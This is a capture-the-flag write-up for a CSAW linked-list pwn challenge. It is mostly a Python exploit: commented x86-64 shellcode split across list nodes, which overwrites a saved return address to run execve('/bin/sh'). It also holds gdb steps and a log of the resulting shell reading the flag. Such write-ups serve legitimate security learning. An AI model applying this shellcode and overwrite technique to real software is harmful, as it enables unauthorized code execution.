shell-&gt;code
==============

Linked lists are great! They let you chain pieces of data together.

`nc pwn.chal.csaw.io 9005`

[shellpointcode](/files/32cc91e380dac838a4f2978dfd963fb3/shellpointcode){.chal-file}

Debugging
=========

First, jump back to goobye:buffer. Then

```py
payload = b''
payload += b'\x90'*3
payload += b'\x48\x31\xd2'                              # xor    %rdx, %rdx
payload += b'\xb0\x3b'                                  # mov    $0x3b, %al
payload += b'\xeb\x09' + b'\x90'                        # jmp 11 through save_rip
payload += p64(save_rip - 8)                            # jump back to buffer
payload += b'\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68'  # mov $0x68732f6e69622f2f, %rbx
payload += b'\xeb\x01'                                  # jmp 3 through null byte

node2_text  = b''
node2_text += b'\x90'*5             # padding, overwrited by payload
node2_text += b'\x48\xc1\xeb\x08'   # shr    $0x8, %rbx
node2_text += b'\x53'               # push   %rbx
node2_text += b'\x48\x89\xe7'       # mov    %rsp, %rdi
node2_text += b'\xeb\x11'           # jmp 19 to node1->buffer

node1_text  = b''
node1_text += b'\x50'                        # push   %rax
node1_text += b'\x57'                        # push   %rdi
node1_text += b'\x48\x89\xe6'                # mov    %rsp, %rsi
node1_text += b'\xb0\x3b'                    # mov    $0x3b, %al
node1_text += b'\x0f\x05'                    # syscall
node1_text += b'\x90'*(15 - len(node1_text))
```

```gdb
break *goodbye+70
c
i r rdi rsi rdx
x/2xg $rsi
```

Flag
====

```bash
$ python sol.py
[+] Opening connection to pwn.chal.csaw.io on port 9005: Done
[*] ADDR_node1_next       : 0x7ffec82225b0
[*] ADDR_goodbye_save_rip : 0x7ffec82225a8
[+] pause null!
[*] Switching to interactive mode

Thanks \x90\x90\x90H1Ґ\x90\xa0%"\x7f
$
$ ls
flag.txt
shellpointcode
$ cat fl*
flag{NONONODE_YOU_WRECKED_BRO}
$
[*] Closed connection to pwn.chal.csaw.io port 9005
```
